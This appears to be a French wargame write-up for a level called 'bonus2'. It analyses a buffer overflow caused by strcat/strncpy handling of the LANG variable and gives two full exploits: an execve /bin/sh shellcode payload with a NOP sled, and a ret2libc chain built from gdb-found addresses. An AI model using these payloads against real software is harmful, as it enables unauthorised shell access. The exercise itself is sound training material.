"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

Offset 23

set args $(python -c 'print 40*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print 23*"A" + "\x08\xf8\xff\xbf"')

(gdb) find /b $esp, +1000, 0x6a, 0x0b, 0x58, 0x99, 0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x31, 0xc9, 0xcd, 0x80


# bonus2 - Buffer Overflow avec Variables d'Environnement

## Analyse du Programme

**Structure**
- Prend deux arguments en ligne de commande
- Utilise une variable d'environnement LANG
- Contient une fonction greetuser() qui affiche différents messages selon la langue

**Buffers**
- s : Premier buffer pour argv[1]
- var_38 : Buffer pour argv[2]
- str : Buffer dans greetuser()

## Vulnérabilités

**Buffer Overflow dans greetuser()**
- strcat(str, &str) tente de concaténer une zone mémoire au-delà du buffer str
- Cette zone contient les données copiées depuis var_38

**Copie de Mémoire Non Sécurisée**
```c
memcpy(&s[76], var_38, 76);
```
- Copie 76 bytes à partir de la fin du buffer s
- Permet d'écrire au-delà des limites du buffer

## Exploitation

**Construction du Payload**
```python
# Premier argument : shellcode + padding
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
arg1 = "\x90" * 40 + shellcode

# Second argument : padding + adresse de retour
arg2 = "A" * 23 + "\x08\xf8\xff\xbf"
```

**Commande d'Exploitation**
```bash
./bonus2 $(python -c 'print 40*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print 23*"A" + "\x08\xf8\xff\xbf"')
```

## Processus d'Exploitation

1. Le premier argument contient :
   - Des NOPs comme zone d'atterrissage
   - Le shellcode qui exécute /bin/sh

2. Le second argument contient :
   - Un padding de 23 bytes
   - L'adresse de retour pointant vers notre shellcode

3. La fonction greetuser() :
   - Tente de concaténer la zone mémoire corrompue
   - Provoque un débordement de buffer
   - Redirige l'exécution vers notre shellcode

4. Le shellcode est exécuté, donnant accès à un shell












# Ret2Libc

## Analyse

- `strncpy()` de 40 caracteres de argv[1]: 0xbffff5e0
- `strncpy()` de 32 caracteres de argv[2]: 0xbffff608
- Ecart de 40 caracteres entre les deux adresses
- Recuperation de la variable d'ENV "LANG", changement du comportement de `greetuser()` en consequence
 ```
    +-> Si "LANG" == "fi"
    |     +-> Concatenation de "\x48\x79\x76\xc3\xa4\xc3\xa4\x20\x70\xc3\xa4\x69\x76\xc3\xa4\xc3\xa4\x20" et du 1er `strncpy()`
    |
    +-> Si "LANG" == "nl"
    |     +-> Concatenation de "Goedemiddag! " et du 1er `strncpy()`
    |
    +-> Sinon
          +-> Concatenation de "Hello " et du 1er `strncpy()`
```
- `puts()` de la concatenation

Il y a un ecart de **40 octets entre les deux adresses**, donc **si argv[1] compte 40 caracteres le "\0" sera ecrase**
**-->** le `strcat()` continuera sa route et prendra alors le second `strncpy()` jusqu'a rencontrer un '\0'

**-->** Modification du **saved-eip** du `main()` possible lorsque le retour d'`strcat()` est de +65 caracteres (si "LANG"=nothing)

`$(python -c 'print "A"*40') $(python -c 'print "B"*25 + NOTRE_INJECTION')`

**Adresse de la libc:**
```
(gdb) info proc mappings
0xb7fcf000 0xb7fd1000     0x2000        0x1a3000    /lib/i386-linux-gnu/libc-2.15.so
     |         |             |              |                   |
   debut      fin         taille      taille totale        chemin absolu
de la region            de la region    du fichier
  memoire                 memoire

```

**Adresse de `system()`:**
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

**Adresse d'`exit()`:**
```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

**Adresse de la string "/bin/sh":**
```
objdump -s -j .rodata /lib/i386-linux-gnu/libc-2.15.so | grep /bin/sh
160c50      726e616c    002d6300    2f62696e    2f736800  rnal.-c./bin/sh.
   |
 offset
```

(adresse_libc + 160c50 + len("rnal.-c.")) = 0xb7f8cc58

-> 0xb7fcf000 + 0x160c50 + 0x8 = 0xb7f8cc58

**Resultat:**
`$(python -c 'print "A"*40') $(python -c 'print "B"*25 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')`

##### Mais non ! Notre injection ne sera pas copiee en entier.
**->** ``"B"*25 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7" == 37 octets alors que le `strcpy()` n'en copie que 32``

- Notre injection ce fait suite a au `strcat()` qui concatene une chaine suivant la valeur de "LANG" a nos arguments.

- Ces chaines ont des longueurs differentes, par defaut, on aura "Hello ", soit **7 caracteres**.

- On peut donc utiliser cela pour nous rapprocher d'$ebp+4.

Si **"LANG"="fi"**, on a "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4" soit **18 caracteres** !

Grace a cela, on refait le calcul pour connaitre la distance d'$ebp+4 et **l'offset diminue de 7 octets ce qui est suffisant**.

`$(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')`


